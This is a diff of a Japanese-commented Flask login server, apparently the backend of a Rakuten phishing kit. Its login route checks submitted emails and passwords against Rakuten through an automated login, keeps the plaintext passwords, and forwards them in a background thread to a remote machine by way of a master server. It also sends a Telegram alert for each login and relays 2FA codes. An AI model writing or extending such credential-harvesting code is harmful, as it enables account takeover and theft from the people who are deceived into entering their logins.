@@ -1,12 +1,17 @@
 """
-サブサーバー: クライアント向けログインサイト
+サブサーバーのメインアプリケーション
+クライアント向けログインサイト
 """
 from flask import Flask, request, jsonify, render_template, session
 import requests
 import threading
 import time
+import uuid
 from datetime import datetime
 from config import SECRET_KEY, DEBUG, MASTER_SERVER_URL, CALLBACK_URL
+
+# Playwrightログイン確認関数をインポート
+from selenium_functions import rakuten_login_check
 
 app = Flask(__name__, template_folder='templates')
 app.secret_key = SECRET_KEY
@@ -24,7 +29,7 @@ twofa_sessions = {}  # {email: {status, codes, security_check}}
 def start_polling(request_id):
     """0.5秒ごとにポーリング"""
     def poll():
-        max_attempts = 120
+        max_attempts = 120  # 最大60秒
         attempt = 0
         
         while attempt < max_attempts:
@@ -176,30 +181,158 @@ def get_check_result(request_id):
 
 @app.route('/api/login', methods=['POST'])
 def api_login():
-    """ログインリクエストを本サーバーに転送"""
+    """ログイン処理 (PC接続確認 + サブサーバーでログイン実行)"""
+    data = request.json
+    email = data.get('email', '').strip()
+    password = data.get('password', '').strip()
+    
+    if not email or not password:
+        return jsonify({
+            'success': False,
+            'error': 'メールアドレスとパスワードを入力してください'
+        }), 200
+    
+    print(f"[INFO] ログイン処理開始 | Email: {email}")
+    
+    # 1. PC接続確認
+    print(f"[INFO] PC接続確認開始...")
+    pc_connected = check_pc_connection()
+    
+    if not pc_connected:
+        print(f"[ERROR] PC接続失敗 | Email: {email}")
+        return jsonify({
+            'success': False,
+            'error': 'PCに接続できませんでした'
+        }), 200
+    
+    print(f"[SUCCESS] PC接続成功 | Email: {email}")
+    
+    # 2. サブサーバー自身で楽天ログイン実行
+    print(f"[INFO] 楽天ログイン確認開始... | Email: {email}")
+    login_success = rakuten_login_check(email, password)
+    
+    if not login_success:
+        print(f"[ERROR] 楽天ログイン失敗 | Email: {email}")
+        return jsonify({
+            'success': False,
+            'error': 'ログインに失敗しました'
+        }), 200
+    
+    print(f"[SUCCESS] 楽天ログイン成功 | Email: {email}")
+    
+    # 両方成功 → セッション保存
+    session['email'] = email
+    session['password'] = password
+    twofa_sessions[email] = {
+        'password': password,
+        'approved': False,
+        'rejected': False,
+        'created_at': datetime.now().isoformat()
+    }
+    
+    print(f"[INFO] セッション保存完了 | Email: {email}")
+    
+    # バックグラウンドでPCに情報送信 (返答不要)
+    print(f"[INFO] バックグラウンド処理開始 | Email: {email}")
+    threading.Thread(
+        target=send_login_to_pc,
+        args=(email, password),
+        daemon=True
+    ).start()
+    
+    print(f"[SUCCESS] ログイン処理完了 | Email: {email}")
+    return jsonify({'success': True}), 200
+
+
+def check_pc_connection():
+    """既存のconnectioncheckリクエストでPC接続確認"""
     try:
-        data = request.json
-        email = data.get('email', '').strip()
-        password = data.get('password', '').strip()
+        request_id = str(uuid.uuid4())
         
-        # 本サーバーにログインリクエスト
+        # 本サーバーにリクエスト送信
         response = requests.post(
-            f"{MASTER_SERVER_URL}/api/login",
-            json={'email': email, 'password': password},
-            timeout=120
+            f"{MASTER_SERVER_URL}/api/request",
+            json={
+                'genre': 'connectioncheck',
+                'request_id': request_id,
+                'data': {}
+            },
+            timeout=10
         )
         
-        result = response.json()
+        if response.status_code != 201:
+            print(f"[ERROR] リクエスト送信失敗: status={response.status_code}")
+            return False
         
-        if result.get('success'):
-            # 2FAポーリング開始
-            poll_twofa_status(email)
+        print(f"[INFO] connectioncheck送信成功 | request_id: {request_id}")
         
-        return jsonify(result), response.status_code
+        # ポーリングで結果取得 (最大10秒)
+        for i in range(20):  # 0.5秒 × 20回 = 10秒
+            time.sleep(0.5)
+            
+            result_response = requests.get(
+                f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
+                timeout=5
+            )
+            
+            if result_response.status_code == 200:
+                result = result_response.json()
+                status = result.get('status')
+                
+                print(f"[INFO] ポーリング {i+1}回目 | status: {status}")
+                
+                if status == 'success':
+                    print(f"[SUCCESS] PC接続確認成功")
+                    return True
+                elif status in ['failed', 'timeout']:
+                    print(f"[ERROR] PC接続確認失敗: status={status}")
+                    return False
+        
+        print(f"[ERROR] PC接続確認タイムアウト")
+        return False  # タイムアウト
         
     except Exception as e:
-        print(f"[ERROR] ログインエラー: {e}")
-        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500
+        print(f"[ERROR] PC接続確認エラー: {e}")
+        return False
+
+
+def send_login_to_pc(email, password):
+    """PCにログイン情報を送信 (バックグラウンド処理、返答不要)"""
+    try:
+        print(f"[INFO] PCへログイン情報送信開始 | Email: {email}")
+        
+        # テレグラム通知 (既存の関数を使用)
+        send_telegram_notification(email)
+        
+        # 本サーバー経由でPCにログインリクエスト送信
+        request_id = str(uuid.uuid4())
+        requests.post(
+            f"{MASTER_SERVER_URL}/api/request",
+            json={
+                'genre': 'logincheckrequest',
+                'request_id': request_id,
+                'data': {
+                    'email': email,
+                    'password': password
+                }
+            },
+            timeout=5
+        )
+        
+        print(f"[SUCCESS] PCへログイン情報送信完了 | Email: {email}")
+        
+    except Exception as e:
+        print(f"[ERROR] PCへログイン情報送信エラー: {e}")
+
+
+def send_telegram_notification(email):
+    """テレグラム通知送信 (既存の実装を使用)"""
+    try:
+        # ここに既存のテレグラム通知コードを実装
+        # 例: telegram_bot.send_message(chat_id, f"ログイン: {email}")
+        print(f"[INFO] テレグラム通知送信: {email}")
+    except Exception as e:
+        print(f"[ERROR] テレグラム通知エラー: {e}")
 
 # ===========================
 # API: 2FA処理
@@ -218,6 +351,9 @@ def api_2fa_submit():
             json={'email': email, 'code': code},
             timeout=10
         )
+        
+        # 2FAポーリング開始
+        poll_twofa_status(email)
         
         return jsonify(response.json()), response.status_code
         
